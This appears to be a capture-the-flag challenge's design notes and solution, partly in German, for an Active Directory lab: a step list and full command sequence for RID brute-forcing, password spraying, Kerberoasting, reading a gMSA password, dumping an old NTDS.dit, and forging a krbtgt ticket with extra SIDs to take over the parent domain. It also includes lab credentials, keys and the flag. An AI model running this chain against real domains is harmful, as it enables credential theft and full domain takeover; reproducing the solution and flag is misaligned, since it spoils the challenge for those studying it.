## Attack chain idea

### Step-by-step
1. Unauthenticated RID-Bruteforce um Nutzernamen zu erfahren
2. Username=Passwort sprayen um Niedrig priv. Account (svc_test) zu bekommen
3. Mit svc_test Kerberoasten um Hash von svc_backup zu bekommen
4. Hash mit rockyou+OneRule cracken (maybe nur rockyou dann muss das)
5. svc_backup ist in der Lage das gMSA Passwort von svc_backup_gmsa auszulesen (Account der neuen Domain)
6. svc_backup kann auf SMb Share Backup$ in der neuen Domain zugreifen
7. Dort liegt ein alter NTDS.dit export der Child Domain
8. Die enthaltenen Hashes sind alle wertlos (Passwörter rotiert). Nur der krbtgt Hash ist valid
9. Mit krbtgt Hash sid-History Attack ausführen um Parent Domain zu ownen

### Commands
1. `nxc smb 192.168.109.20 -u '' -p '' --rid-brute`
2. `nxc smb 192.168.109.20 -u '' -p '' --users-export users.txt`
3. `nxc smb 192.168.109.20 -u users.txt -p users.txt --no-bruteforce --continue-on-success`
4. `nxc ldap 192.168.109.20 -u svc_test -p svc_test --kerberoast kerb.hashes`
5. `john kerb.hashes --wordlist=/usr/share/wordlists/rockyou.txt `
6. `nxc ldap 192.168.109.10 -u svc_granite_sync -p Granite00 -d old.velocity.hacklu --gmsa -k`
7. `nxc smb 192.168.109.10 -u svc_backup_gmsa$ --aesKey 27aea95f3198459b86f616481b37d145 --share Backup$ --get-file EXPORT/SYSTEM SYSTEM`
8. `nxc smb 192.168.109.10 -u svc_backup_gmsa$ --aesKey 27aea95f3198459b86f616481b37d145 --share Backup$ --get-file EXPORT/NTDS.dit NTDS.dit`
9. `secretsdump.py LOCAL -system SYSTEM -ntds NTDS.dit`
10. Get domain SIDs
    1. `nxc ldap 192.168.109.10 -u svc_granite_sync -p Granite00 -d old.velocity.hacklu --get-sid -k`
    2. `nxc ldap 192.168.109.20 -u svc_granite_sync -p Granite00 --get-sid -k`
11. Domain escalation:
    1. Ticketer:
        1. `ticketer.py Administrator -aesKey 6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89 -domain old.velocity.hacklu -domain-sid S-1-5-21-976573591-227444304-1123500008 -extra-sid S-1-5-21-274105150-4017454061-1646591600-500`
        2. `export KRB5CCNAME=Administrator.ccache`
        3. `nxc smb 192.168.109.10 --use-kcache --ntds`
    2. NXC raisechild:
        1. `ticketer.py Administrator -aesKey 6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89 -domain old.velocity.hacklu -domain-sid S-1-5-21-976573591-227444304-1123500008`
        2. `export KRB5CCNAME=Administrator.ccache`
        3. `nxc smb 192.168.109.20 --use-kcache --ntds`
        4. `nxc ldap 192.168.109.20 -u Administrator -H d6fec3954c99c7c2250c16d81feaa9e9 -M raisechild`
        5. `rm Administrator.ccache`
        6. `nxc smb 192.168.109.10 --use-kcache --ntds`
12. `nxc smb 192.168.109.10 --use-kcache --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`



## Manual configuration steps
### NTDS.dit export
1. Extract NTDS.dit and SYSTEM hive: `ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit`
2. Download the files from Child:
   1. `poetry run nxc smb 192.168.109.20 -u Administrator -p qcSiecDUATD63Kxm --get-file '\Windows\Temp\NTDS\Active Directory\ntds.dit' NTDS.dit`
   2. `poetry run nxc smb 192.168.109.20 -u Administrator -p qcSiecDUATD63Kxm --get-file '\Windows\Temp\NTDS\registry\SYSTEM' SYSTEM`
3. Remove NTDS extraction: `Remove-Item -Recurse -Force C:\Windows\Temp\NTDS`
4. Upload files to Parent:
   1. `poetry run nxc smb 192.168.109.10 -u Administrator -p C8J33i45kt4HXHMQ --share Backup$ --put-file NTDS.dit '\Export\NTDS.dit'`
   2. `poetry run nxc smb 192.168.109.10 -u Administrator -p C8J33i45kt4HXHMQ --share Backup$ --put-file SYSTEM '\Export\SYSTEM'`


# Flag
Part1: flag{m0v3_f4st_br34k
Part2: _th3_f0r3st_89a71f9g}